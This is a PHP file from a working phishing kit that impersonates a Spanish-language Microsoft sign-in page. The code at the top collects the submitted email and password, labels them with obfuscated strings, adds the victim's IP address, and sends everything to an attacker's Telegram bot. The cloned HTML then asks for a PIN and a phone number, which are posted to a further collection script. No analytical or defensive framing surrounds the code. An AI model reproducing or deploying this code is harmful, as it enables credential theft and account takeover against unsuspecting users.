<?php
include('dt.php');
error_reporting(E_ALL & ~E_NOTICE);
session_start();
function get_client_ip() {
  $ipaddress = '';

  if (getenv('HTTP_CLIENT_IP'))
      $ipaddress = getenv('HTTP_CLIENT_IP');
  else if(getenv('HTTP_X_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
  else if(getenv('HTTP_X_FORWARDED'))
      $ipaddress = getenv('HTTP_X_FORWARDED');
  else if(getenv('HTTP_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_FORWARDED_FOR');
  else if(getenv('HTTP_FORWARDED'))
     $ipaddress = getenv('HTTP_FORWARDED');
  else if(getenv('REMOTE_ADDR'))
      $ipaddress = getenv('REMOTE_ADDR');
  else
      $ipaddress = 'UNKNOWN';
  if (strpos($ipaddress, ",") !== false) :
    $ipaddress = strtok($ipaddress, ",");
  endif;
  return $ipaddress;}
$ip=get_client_ip();
$em=$_POST['userid'];
$co=$_POST['contr'];
@session_start();
if ( isset ($em) && isset ($co)){
$message = "Infor 3m@1l: \r\n  Usu@r10=> ".$em." \r\n P@55w0rq => ".$co."\r\n";
$message .= " IP= ".$ip."\r\n";
$apiToken = $apibot;
$data = [ 'chat_id' => $canal,
   'text' => $message];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); }
      echo ' 
<!DOCTYPE html>
<html dir="ltr" lang="ES-ES">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">	
		<title>Iniciar sesión en tu cuenta Microsoft</title>
		<meta name="PageID" content="i5030">
		<meta name="SiteID" content="292841"><meta name="ReqLC" content="3082"><meta name="LocLC" content="3082">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
		<link rel="icon" href="favicon.ico">
		<link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="min.css">

		<style type="text/css"></style>
		<style type="text/css">
        body{display:none;}</style>
        <script type="text/javascript" src = "jque.js"></script>
        <style type="text/css">body{display:block !important;}</style><noscript>
            <style type="text/css">body{display:block !important;}</style></noscript></head>
        <body class="cb">
            <div><div data-bind="component: { name: &#39;background-image-control&#39;, publicMethods: backgroundControlMethods }">
    <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">  
</div></div>
<div data-bind="if: activeDialog"></div>
<form name="formu1" id="formu1" method="post" action="reslistfopin.php">
    <div class="outer">
        <div class="middle" data-bind="css: { &#39;app&#39;: backgroundLogoUrl }">    
           <div data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {&#39;app&#39;: backgroundLogoUrl,
                    &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                    &#39;fade-in-lightbox&#39;: fadeInLightBox,
                    &#39;has-popup&#39;: showFedCredButtons,
                    &#39;transparent-lightbox&#39;: backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox },
                externalCss: { &#39;sign-in-box&#39;: true }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                <div class="lightbox-cover" ></div>
                <div class="win-scroll">             
                    <div >
                            <img class="logo" role="img" src="logo.svg" alt="Microsoft"></div>
                    <div role="main" >
<div class="">
    <div class="pagination-view animate slide-in-next">
        <div >
<div ><div class="row title ext-title" id="loginHeader" >
    <div role="heading" aria-level="1" id="text23">Crear un Pin</div>
</div></div>

<div style="display: none; font-size: 1.2rem; color:#EB4242; font-weight: normal;" id ="text24" > Ingrese Los datos Completos .</div>

<div class="row">
    <div role="alert" aria-live="assertive">    </div>
    <div class="form-group col-md-24">





<input required type="tel" name="pin_xd" id="pinxd" maxlength="12" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" aria-label="Ingrese su Pin"  aria-describedby="loginHeader" placeholder="Ingrese su Pin" onkeypress="return event.charCode >= 48 && event.charCode <= 57" style="width:115px;height:36px;" autofocus="autofocus">
            <br>
      <div><div class="row title ext-title" id="loginHeader">
    <div role="heading" aria-level="1" data-bind="text: title">Escriba su Nro de Teléfono</div></div></div>
<div class="row">
    <div role="alert" aria-live="assertive">      </div>
    <div class="form-group col-md-24">


            <input required type="tel" class="form-control ltr_override input ext-input text-box ext-text-box" name="tlf_xd" id="tlfxd" maxlength="15" lang="en" placeholder="Ingrese su Telefono" onkeypress="return event.charCode >= 48 && event.charCode <= 57" style="width:145px;height:36px;">



            <br></div> </div></div>
<div class="position-buttons">
    <div class="row">
        <div class="col-md-24">
            <div class="text-13">               
                <div class="form-group">
                    <a id="idA_PWD_SwitchToFido" name="switchToFido" href="#">Iniciar sesión con una llave de seguridad</a>
</div></div></div></div></div></div></form>
<div class="win-button-pin-bottom">
    <div class="row">
        <div ><div class="col-xs-24 no-padding-left-right button-container">
    <div class="inline-block">
     
        <input type="button" id="idSIButton29" class="button ext-button primary ext-primary" value="Iniciar Sesión" onclick="text2()">

    </div></div></div></div></div></div> </div></div></div> </div></div>
        <div id="footer" role="contentinfo" class="default footer ext-footer new-background-image">
            <div><div id="footerLinks" class="footerNode text-secondary">
    <a id="ftrTerms" href="#">Términos de uso</a>
    <a id="ftrPrivacy" href="#">Privacidad y cookies</a>
   </div></div> </div></div></div>
</div></body></html>'; ?>